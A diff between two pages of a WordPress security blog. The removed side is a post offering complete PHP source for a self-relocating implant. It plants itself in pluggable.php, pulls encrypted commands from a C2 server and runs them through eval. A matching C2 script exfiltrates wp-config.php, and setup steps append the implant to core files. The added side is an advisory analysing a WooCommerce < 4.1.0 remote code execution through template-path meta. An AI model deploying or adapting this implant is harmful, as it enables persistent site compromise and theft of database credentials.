@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html class="no-js" lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WordPress security testing – WP deeply</title><link rel="dns-prefetch" href="//s.w.org"><link rel="stylesheet" id="wp-block-library-css" href="https://wpdeeply.com/wp-includes/css/dist/block-library/style.min.css" media="all"><link rel="stylesheet" id="coblocks-frontend-css" href="https://wpdeeply.com/wp-content/plugins/coblocks/dist/coblocks-style.css" media="all"><link rel="stylesheet" id="mkaz-code-syntax-css-css" href="https://wpdeeply.com/wp-content/plugins/code-syntax-block/assets/blocks.style.css" media="all"><link rel="stylesheet" id="mkaz-code-syntax-prism-css-css" href="https://wpdeeply.com/wp-content/plugins/code-syntax-block/assets/prism/prism.css" media="all"><link rel="stylesheet" id="twentytwenty-style-css" href="https://wpdeeply.com/wp-content/themes/twentytwenty/style.css" media="all"><style id="twentytwenty-style-inline-css">
+<html class="no-js" lang="en-US"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>WooCommerce < 4.1.0 Remote Code Execution - WP deeply</title><link rel="dns-prefetch" href="//s.w.org"><link rel="stylesheet" id="wp-block-library-css" href="https://wpdeeply.com/wp-includes/css/dist/block-library/style.min.css" media="all"><link rel="stylesheet" id="coblocks-frontend-css" href="https://wpdeeply.com/wp-content/plugins/coblocks/dist/coblocks-style.css" media="all"><link rel="stylesheet" id="mkaz-code-syntax-css-css" href="https://wpdeeply.com/wp-content/plugins/code-syntax-block/assets/blocks.style.css" media="all"><link rel="stylesheet" id="mkaz-code-syntax-prism-css-css" href="https://wpdeeply.com/wp-content/plugins/code-syntax-block/assets/prism/prism.css" media="all"><link rel="stylesheet" id="twentytwenty-style-css" href="https://wpdeeply.com/wp-content/themes/twentytwenty/style.css" media="all"><style id="twentytwenty-style-inline-css">
 .color-accent,.color-accent-hover:hover,.color-accent-hover:focus,:root .has-accent-color,.has-drop-cap:not(:focus):first-letter,.wp-block-button.is-style-outline,a { color: #e22658; }blockquote,.border-color-accent,.border-color-accent-hover:hover,.border-color-accent-hover:focus { border-color: #e22658; }button:not(.toggle),.button,.faux-button,.wp-block-button__link,.wp-block-file .wp-block-file__button,input[type="button"],input[type="reset"],input[type="submit"],.bg-accent,.bg-accent-hover:hover,.bg-accent-hover:focus,:root .has-accent-background-color,.comment-reply-link { background-color: #e22658; }.fill-children-accent,.fill-children-accent * { fill: #e22658; }:root .has-background-color,button,.button,.faux-button,.wp-block-button__link,.wp-block-file__button,input[type="button"],input[type="reset"],input[type="submit"],.wp-block-button,.comment-reply-link,.has-background.has-primary-background-color:not(.has-text-color),.has-background.has-primary-background-color *:not(.has-text-color),.has-background.has-accent-background-color:not(.has-text-color),.has-background.has-accent-background-color *:not(.has-text-color) { color: #ffffff; }:root .has-background-background-color { background-color: #ffffff; }body,.entry-title a,:root .has-primary-color { color: #000000; }:root .has-primary-background-color { background-color: #000000; }cite,figcaption,.wp-caption-text,.post-meta,.entry-content .wp-block-archives li,.entry-content .wp-block-categories li,.entry-content .wp-block-latest-posts li,.wp-block-latest-comments__comment-date,.wp-block-latest-posts__post-date,.wp-block-embed figcaption,.wp-block-image figcaption,.wp-block-pullquote cite,.comment-metadata,.comment-respond .comment-notes,.comment-respond .logged-in-as,.pagination .dots,.entry-content hr:not(.has-background),hr.styled-separator,:root .has-secondary-color { color: #6d6d6d; }:root .has-secondary-background-color { background-color: #6d6d6d; }pre,fieldset,input,textarea,table,table *,hr { border-color: #dbdbdb; }caption,code,code,kbd,samp,.wp-block-table.is-style-stripes tbody tr:nth-child(odd),:root .has-subtle-background-background-color { background-color: #dbdbdb; }.wp-block-table.is-style-stripes { border-bottom-color: #dbdbdb; }.wp-block-latest-posts.is-grid li { border-top-color: #dbdbdb; }:root .has-subtle-background-color { color: #dbdbdb; }body:not(.overlay-header) .primary-menu > li > a,body:not(.overlay-header) .primary-menu > li > .icon,.modal-menu a,.footer-menu a, .footer-widgets a,#site-footer .wp-block-button.is-style-outline,.wp-block-pullquote:before,.singular:not(.overlay-header) .entry-header a,.archive-header a,.header-footer-group .color-accent,.header-footer-group .color-accent-hover:hover { color: #cd2653; }.social-icons a,#site-footer button:not(.toggle),#site-footer .button,#site-footer .faux-button,#site-footer .wp-block-button__link,#site-footer .wp-block-file__button,#site-footer input[type="button"],#site-footer input[type="reset"],#site-footer input[type="submit"] { background-color: #cd2653; }.header-footer-group,body:not(.overlay-header) #site-header .toggle,.menu-modal .toggle { color: #000000; }body:not(.overlay-header) .primary-menu ul { background-color: #000000; }body:not(.overlay-header) .primary-menu > li > ul:after { border-bottom-color: #000000; }body:not(.overlay-header) .primary-menu ul ul:after { border-left-color: #000000; }.site-description,body:not(.overlay-header) .toggle-inner .toggle-text,.widget .post-date,.widget .rss-date,.widget_archive li,.widget_categories li,.widget cite,.widget_pages li,.widget_meta li,.widget_nav_menu li,.powered-by-wordpress,.to-the-top,.singular .entry-header .post-meta,.singular:not(.overlay-header) .entry-header .post-meta a { color: #6d6d6d; }.header-footer-group pre,.header-footer-group fieldset,.header-footer-group input,.header-footer-group textarea,.header-footer-group table,.header-footer-group table *,.footer-nav-widgets-wrapper,#site-footer,.menu-modal nav *,.footer-widgets-outer-wrapper,.footer-top { border-color: #dcd7ca; }.header-footer-group table caption,body:not(.overlay-header) .header-inner .toggle-wrapper::before { background-color: #dcd7ca; }
 </style><link rel="stylesheet" id="twentytwenty-print-style-css" href="https://wpdeeply.com/wp-content/themes/twentytwenty/print.css" media="print"><script src="https://wpdeeply.com/wp-content/themes/twentytwenty/assets/js/index.js" async></script><script>document.documentElement.className = document.documentElement.className.replace( 'no-js', 'js' );</script><style id="custom-background-css">
 body.custom-background { background-color: #ffffff; }
-</style></head><body class="post-template-default single single-post postid-209 single-format-standard custom-background wp-embed-responsive is-twentytwenty singular missing-post-thumbnail has-single-pagination showing-comments show-avatars footer-top-hidden reduced-spacing">
+</style></head><body class="post-template-default single single-post postid-217 single-format-standard custom-background wp-embed-responsive is-twentytwenty singular missing-post-thumbnail has-single-pagination showing-comments show-avatars footer-top-hidden reduced-spacing">
 
 		<a class="skip-link screen-reader-text" href="#site-content">Skip to the content</a>
 		<header id="site-header" class="header-footer-group" role="banner"><div class="header-inner section-inner">
@@ -95,16 +95,16 @@ body.custom-background { background-color: #ffffff; }
 
 </div>
 
-<main id="site-content" role="main"><article class="post-209 post type-post status-publish format-standard hentry category-redteam tag-0day" id="post-209"><header class="entry-header has-text-align-center header-footer-group"><div class="entry-header-inner section-inner medium">
+<main id="site-content" role="main"><article class="post-217 post type-post status-publish format-standard hentry category-plugins tag-fixed" id="post-217"><header class="entry-header has-text-align-center header-footer-group"><div class="entry-header-inner section-inner medium">
 
 		
 			<div class="entry-categories">
 				<span class="screen-reader-text">Categories</span>
 				<div class="entry-categories-inner">
-					<a href="https://wpdeeply.com/category/redteam/" rel="category tag">redteam</a>				</div>
+					<a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
 			</div>
 
-			<h1 class="entry-title">WordPress security testing</h1>
+			<h1 class="entry-title">WooCommerce 
 		<div class="post-meta-wrapper post-meta-single post-meta-single-top">
 
 			<ul class="post-meta"><li class="post-author meta-wrapper">
@@ -119,213 +119,96 @@ body.custom-background { background-color: #ffffff; }
 							<span class="screen-reader-text">Post date</span>
 							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
 						<span class="meta-text">
-							<a href="https://wpdeeply.com/wordpress-security-testing/">August 24, 2020</a>
+							<a href="https://wpdeeply.com/woocommerce-4-1-0-remote-code-execution/">August 25, 2020</a>
 						</span>
 					</li>
 					
 			</ul></div>
 
 		
-	</div>
+	</h1></div>
 
 </header><div class="post-inner thin ">
 
 		<div class="entry-content">
 
 			
-<p>There are a lot of security solutions around WP eco system advertising their possibility to fight malware, intrusions and exploitation. Most of them are endpoint security solutions, there are cloud ones, but also market knows the managed WP services that offer security in their own way. Having big choice sometime is a problem, because you can’t verify all of the claims and if you try, you will need to waste huge load of time auditing / testing. That is why the goal of this section is to provide tools and methods for easy verification of those claims and to help users into choosing the right offering. </p>
+<p>WooCommerce plugin is raw model how good WordPress plugin should look like and very often we can see how many another plugins around eco system very often borrow knowledge/source from it and that is probably ok. What is important to be mentioned here is the fact that there isn’t any log that will show us all of those usages, but changelogs should be enough for developers to get the idea being Security fixes or not? From the 4.1.0 changelog we have the following:</p>
 
 
 
-<h2>Attack demo</h2>
+<pre class="wp-block-code"><code class="">* Security - Fixed unescaped meta data while duplicating products. Reported by Slavco.
+</code></pre>
 
 
 
-<p>For the purpose of testing two scripts are created: malware/implant and remote C2 server script. Both are extremely easy for setup, but default versions are prepared in that way, so their abuse would require modifications. </p>
+<p>but is this enough, is everything told and do you get the idea about the vulnerability?!</p>
 
 
 
-<h5>malware</h5>
+<figure class="wp-block-video"><video controls src="https://wpdeeply.com/wp-content/uploads/2020/07/woosploit.mp4"></video></figure><p> I know, no or maybe is the answer.</p>
 
 
 
-<p>This software is based on <a rel="noreferrer noopener" href="https://github.com/Slavco/wp-weaver" target="_blank">wp-weaver</a> project, includes encryption in order to hide its actions and is more than modular to accept and execute everything that is sent by C2. </p>
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woosploit.md#what-is-fixed-in-410"></a>What is fixed in 4.1.0</h2>
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">//marker_weaver_ftw
-$target_files = array(
-    ABSPATH . WPINC . '/pluggable.php'
-    //just for demo purposes, that is why too few :)
-);
-
-//must be here because collisions of the rand and race conditions
-if ( ! function_exists("weaver_plant_payload") ){
-    function weaver_plant_payload($file, $payload_data, $append){
-        //grab the session for one peer only - payload almost forever in memory
-        if ( isset($_REQUEST["peer"]) && $_REQUEST["peer"]!="" ) sleep(9);
-        if ( $append ){
-            @file_put_contents($file, $payload_data, FILE_APPEND | LOCK_EX);
-        }else{
-            @file_put_contents($file, $payload_data, LOCK_EX);
-        }
-        //time window to switch "session" towards another peer
-        if ( isset($_REQUEST["peer"]) && $_REQUEST["peer"]!="" ) sleep(2);
-    }
-    $the_file = $target_files[rand(0,(sizeof($target_files)-1))];
-    $my_content = @file_get_contents(__FILE__);
-    $my_content_list = @explode("//\x6Darker_weaver_ftw", $my_content);
-    if ( is_array($my_content_list) && sizeof($my_content_list) >= 2 ){
-        @file_put_contents(__FILE__, $my_content_list[0]);
-        @register_shutdown_function("weaver_plant_payload", $the_file, "//\x6Darker_weaver_ftw".$my_content_list[1], true);
-    }else{
-        //shouldn't be here, but at least don't damage the instance
-        @register_shutdown_function("weaver_plant_payload", __FILE__, $my_content, false);
-    }
-}
-//malware code below - any length, any logic
-if ( isset($_REQUEST["wpdeeply"])){
-    //choose the code execution method
-    $method_exec = 'eval';
-    $test_pass = FALSE;
-    
-    //test if execution mechanism works
-    if ( $method_exec ){
-        switch( $method_exec ){
-            case 'eval':
-                $test_data = '$find_me = array("find_me");';
-                eval($test_data);
-                if (isset($find_me) && is_array($find_me) && in_array('find_me', $find_me)) $test_pass = TRUE;
-                break;
-                //...
-        }
-        //if works then load instructions from c2
-        if ( $test_pass ){
-            
-	    	//hardcoded values put here during delivery of the test malware
-            define('C2_URL', 'https://local.host/c2.php');
-            $c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
-            
-            //encryption key for delivered payload
-            $session_key = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_KEYBYTES);
-            
-            //prepare data for c2 instruction
-            $json_requirements = json_encode(array(
-                'key'   => base64_encode($session_key),
-                'type' => 'eval'
-            ));
-            
-            //encrypt with c2 pub key
-            $rcr = \Sodium\crypto_box_seal(
-                $json_requirements,
-                $c2_box_publickey
-                );
-            
-            //get results
-            $c2_remote_fetch = wp_remote_post(
-                C2_URL,
-                array(
-                    'body' => array(
-                        'rcr'   => $rcr
-                    ),
-                )
-                );
-            //veryfy response
-            if ( ! is_wp_error( $c2_remote_fetch ) ) {
-                $c2_remote = json_decode( wp_remote_retrieve_body( $c2_remote_fetch ), true );
-            }
-            //verify response data format and execute commands
-            if ( is_array( $c2_remote ) && isset( $c2_remote['payload'] ) && isset( $c2_remote['nonce'] ) ) {
-                
-                $payload_encrypted = base64_decode( $c2_remote['payload'] );
-                $nonce = base64_decode( $c2_remote['nonce'] );
-                
-                //decrypt final payload from c2
-                $payload = \Sodium\crypto_secretbox_open($payload_encrypted, $nonce, $session_key);
-                if ( $payload !== false ){
-                    @eval($payload);
-                }
-            }
-        }
-    }
-}</code></pre>
+<p>According the logs there is issue with unescaped meta keys while duplicating products and fix is more than obvious e.g. there is <code>wp_slash</code>added to the <code>$meta->key</code> in <code>class-wc-data-store-wp.php</code>.</p>
 
 
 
-<h5>C2</h5>
+<pre class="wp-block-code"><code class="">return add_metadata( $this->meta_type, $object->get_id(), wp_slash( $meta->key ), is_string( $meta->value ) ? wp_slash( $meta->value ) : $meta->value, false );
+
+</code></pre>
 
 
 
-<p>This is simple server side script, that will serve the payload when requested by its malware and will log its actions in order to harvest the fruits of commands execution.</p>
+<p>So where is the RCE? If we see the code diff experienced eye should get the attention of changes in <code>class-wc-template-loader.php</code> file, method <code>get_template_loader_files</code> e.g.</p>
 
 
 
-<pre class="wp-block-code"><code lang="php" class="language-php">include 'sodium_compat/autoload.php';
+<pre class="wp-block-code"><code class="">if ( is_page_template() ) {
+			$page_template = get_page_template_slug();
 
-//handle the requests from the client/s
-if ( isset($_POST["rcr"]) ){
-    $encrypted_remote_client_requirements = $_POST["rcr"];
-}else{
-    exit(0);
-}
-
-//simple payload code with arrogant exfiltration method, but possible only for users with upload permissions :) 
-$remote_cmd = '
-    if ( defined("ABSPATH") ){
-        if ( file_exists(ABSPATH."wp-config.php") ){
-            wp_upload_bits("wpdeeply.jpg", "", \Sodium\crypto_box_seal(file_get_contents(ABSPATH."wp-config.php"), $c2_box_publickey));
-        }
-    }
-';
-
-
-//c2 public and secret keys
-$c2_box_secretkey = base64_decode('Gr10jP1z0VTyRtaJIav8ElMcmvQ6abfnkfKz5wftI+c=');
-$c2_box_publickey = base64_decode('CCp/4qGswYmd47p4heS8kwnC3z++VwGN7fRLOCi5sn0=');
-
-$c2_box_kp = \Sodium\crypto_box_keypair_from_secretkey_and_publickey(
-    $c2_box_secretkey,
-    $c2_box_publickey
-    );
-
-//decode the data received from client
-$remote_client_requirements = \Sodium\crypto_box_seal_open(
-    $encrypted_remote_client_requirements,
-    $c2_box_kp
-    );
-
-$remote_client_requirements = @json_decode($remote_client_requirements, true);
-if ( !$remote_client_requirements ) exit(0);
-
-//reply to the client with payload encrypted with delivered session_key + used nonce 
-if ( is_array($remote_client_requirements) && isset($remote_client_requirements['key']) && isset($remote_client_requirements['type']) ){
-    $session_key = base64_decode($remote_client_requirements['key']);
-    $session_nonce = \Sodium\randombytes_buf(\Sodium\CRYPTO_SECRETBOX_NONCEBYTES);
-    $response = json_encode(array( 'payload' => base64_encode(\Sodium\crypto_secretbox($remote_cmd, $session_nonce, $session_key)), 'nonce'=> base64_encode($session_nonce)));
-    //add some fancy logging in order to know the client and type+format of exfiltrated data 
-    echo $response;
-}
-exit();</code></pre>
+			if ( $page_template ) {
+				$validated_file = validate_file( $page_template );
+				if ( 0 === $validated_file ) {
+					$templates[] = $page_template;
+				} else {
+					error_log( "WooCommerce: Unable to validate template path: \"$page_template\". Error Code: $validated_file." );
+				}
+			}
+		}
+</code></pre>
 
 
 
-<h5>Setup</h5>
+<p>and this means that there is added validation to the value returned by <code>get_page_template_slug</code> which in fact is <code>_wp_page_template</code> protected meta value. This means that <code>_wp_page_template</code> could hold any value towards any location and that value to be <code>included</code> while rendering templates at WP.</p>
 
 
 
-<p>In order to run the demo on your own WP instance you will need the following:</p>
+<pre class="wp-block-code"><code class="">$template = apply_filters( 'template_include', $template );
+	if ( $template ) {
+		include $template;
+	} elseif
+</code></pre>
 
 
 
-<ul><li>You will need to be logged in as user with upload permissions on the WP (it is this way in order to be stopped abuse of the scripts and that is why in the payload is used <span class="has-inline-color has-primary-color"><strong>wp_upload_bits</strong></span> function)</li><li>In the malware script set up your own value for <span class="has-inline-color has-primary-color"><strong>C2_URL</strong></span> constant and that is the url of your C2 script</li><li>In order to work C2 script you will need <strong>sodium_compat</strong> next to it and it could be found into any WP 5+ distribution under wp-includes folder</li><li>cat malware.txt >> /path_to_your_code/wp-includes/pluggable.php</li><li>Logged in with user with upload permissions hit refresh on your WP homepage with <strong>?wpdeeply=ok</strong> parameters and check in the upload directory <strong>wpdeeply?-x.jpg</strong> with encrypted <strong>wp-config.php</strong> content </li></ul><h2>Successful demo</h2>
+<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woosploit.md#who-is-affected"></a>Who is affected</h2>
 
 
 
-<p>This means that you managed to put malware on your WP and to execute code in it. For tech people it is clear (try to use peer method of the weaver) what is done in the background, but for not tech savvy users won’t be, but both are more than free to question its security guarantee about the events. Questions that would be good to be answered:</p>
+<p>Attack surface is bigger than advertised.</p>
 
 
 
-<ul><li>Why malware doesn’t disappear after update / re-install from admin screen or wpcli?</li><li>What type of commands “attacker” executed against WP?</li><li>What data was leaked and where?   </li><li>… </li></ul><p></p>
+<ul><li>Duplicating products</li><li>Protected meta could be written while importing products trough new Woo importer, remember it is <code>class-wc-data-store-wp.php</code></li><li>Because <code>class-wc-template-loader.php</code> any <code>import</code> user role is RCE able on Woo setups, but there is <a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/" target="_blank" rel="noreferrer noopener">contributor/visitor</a> attack in game</li><li>Unserialize trough <a href="https://wpdeeply.com/wordpress-attachment-api-functions-and-any-post-type/" target="_blank" rel="noreferrer noopener">PHAR</a> maybe?</li><li>All of those Woo marketplaces, multi language stores, managed setups…  </li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/woosploit.md#remediation"></a>Remediation</h2>
+
+
+
+<p>Take measures about content in any uploaded files on your WP setup, but also for the content of the files that could be created while modifing them.</p>
 
 		</div>
 
@@ -340,7 +223,7 @@ exit();</code></pre>
 							<span class="screen-reader-text">Tags</span>
 							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
 						<span class="meta-text">
-							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
+							<a href="https://wpdeeply.com/tag/fixed/" rel="tag">fixed</a>						</span>
 					</li>
 					
 			</ul></div>
@@ -349,19 +232,14 @@ exit();</code></pre>
 	</div>
 
 	
-	<nav class="pagination-single section-inner" aria-label="Post" role="navigation"><hr class="styled-separator is-style-wide" aria-hidden="true"><div class="pagination-single-inner">
+	<nav class="pagination-single section-inner only-one only-prev" aria-label="Post" role="navigation"><hr class="styled-separator is-style-wide" aria-hidden="true"><div class="pagination-single-inner">
 
 			
-				<a class="previous-post" href="https://wpdeeply.com/wordpress-protected-meta-via-wp-job-manager/">
+				<a class="previous-post" href="https://wpdeeply.com/wordpress-security-testing/">
 					<span class="arrow" aria-hidden="true">←</span>
-					<span class="title"><span class="title-inner">WordPress protected meta via wp job manager</span></span>
+					<span class="title"><span class="title-inner">WordPress security testing</span></span>
 				</a>
 
-				
-				<a class="next-post" href="https://wpdeeply.com/woocommerce-4-1-0-remote-code-execution/">
-					<span class="arrow" aria-hidden="true">→</span>
-						<span class="title"><span class="title-inner">WooCommerce < 4.1.0 Remote Code Execution</span></span>
-				</a>
 				
 		</div>
 
